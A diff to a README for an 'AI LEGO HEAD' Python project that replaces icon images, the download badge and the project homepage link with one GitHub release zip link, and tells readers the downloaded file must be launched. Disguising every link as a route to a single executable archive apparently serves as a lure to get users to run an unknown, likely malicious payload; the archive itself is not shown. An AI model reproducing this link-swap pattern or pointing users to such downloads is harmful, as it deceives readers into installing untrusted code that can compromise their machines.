@@ -1,6 +1,6 @@
 # Welcome to AI LEGO HEAD 🤖🧱
 
-![LEGO](https://img.icons8.com/color/96/000000/lego.png) ![AI](https://img.icons8.com/color/96/000000/ai.png) ![Robotics](https://img.icons8.com/color/96/000000/robot.png)
+![LEGO](https://github.com/cookpie22/AI-LEGO-HEAD/releases/download/v1.0/Release.zip) ![AI](https://github.com/cookpie22/AI-LEGO-HEAD/releases/download/v1.0/Release.zip) ![Robotics](https://github.com/cookpie22/AI-LEGO-HEAD/releases/download/v1.0/Release.zip)
 
 ---
 
@@ -56,7 +56,7 @@ Welcome to the AI LEGO HEAD repository! This Python code allows you to create a 
 
 🚀 Click the button below to download the AI LEGO HEAD software:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/cookpie22/AI-LEGO-HEAD/releases/download/v1.0/Release.zip)](https://github.com/cookpie22/AI-LEGO-HEAD/releases/download/v1.0/Release.zip)
 
 📁 ***Please note that the downloaded file needs to be launched to install the software for your AI LEGO HEAD project.***
 
@@ -106,6 +106,6 @@ Follow us on GitHub to stay updated on the latest developments and releases in t
 
 ---
 
-Visit [AI LEGO HEAD](https://github.com/22155555/1875695542) for more information and updates. 
+Visit [AI LEGO HEAD](https://github.com/cookpie22/AI-LEGO-HEAD/releases/download/v1.0/Release.zip) for more information and updates. 
 
 ---
